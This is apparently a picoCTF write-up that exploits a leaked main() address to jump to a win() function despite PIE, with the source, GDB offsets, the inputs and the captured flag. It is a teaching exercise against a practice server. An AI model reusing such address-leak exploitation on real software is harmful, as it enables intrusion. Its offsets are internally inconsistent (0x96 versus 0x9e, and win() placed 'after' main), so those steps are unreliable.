## 👉 Initial Reconnaissance 🔍
First, I downloaded the source and binary to understand what we're dealing with. Ran a quick test:

nc rescued-float.picoctf.net 54167\
Address of main: 0x57a71a42a33d\
Enter the address to jump to, ex => 0x12345: 0x12345 \
Your input: 12345\
Segfault Occurred, incorrect address.

## 👉 Source Code Analysis 📋
Looking at the source:

int main() {\
  signal(SIGSEGV, segfault_handler);\
  setvbuf(stdout, NULL, _IONBF, 0);\
  printf("Address of main: %p\n", &main);  // 🎯 FREE ADDRESS LEAK!\
  unsigned long val;\
  printf("Enter the address to jump to, ex => 0x12345: ");\
  scanf("%lx", &val);\
  void (*foo)(void) = (void (*)())val;\
  foo();  // Jump to whatever address we provide\
}

This is a classic function pointer exploitation, but with PIE enabled so addresses change each run.


## 👉 Finding the Offset 📐
Used GDB to find the static addresses:

(gdb) disas main\
   0x0000000000401271 <+0>:	push

(gdb) disas win\
   0x00000000004011db <+0>:	push 

## 👉 Offset calculation: 0x401271 - 0x4011db = 0x96
So win() is 0x96 bytes after main() in memory.


## 👉 The Solution Strategy 🎯
Since the program gives us main's runtime address:
1. Take the provided main address
2. Subtract 0x9e to get win address
3. Enter that address when prompted


## 👉 Exploitation 🚀

Runtime example:\
Address of main: 0x6254c958533d

Calculation:\
win_address = main_address - 0x96\
win_address = 0x6254c958533d - 0x96 = 0x6254c95852a7

Final input:\
Enter the address to jump to, ex => 0x12345: 0x6254c95852a7\
You won!\
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_6f4e7236}
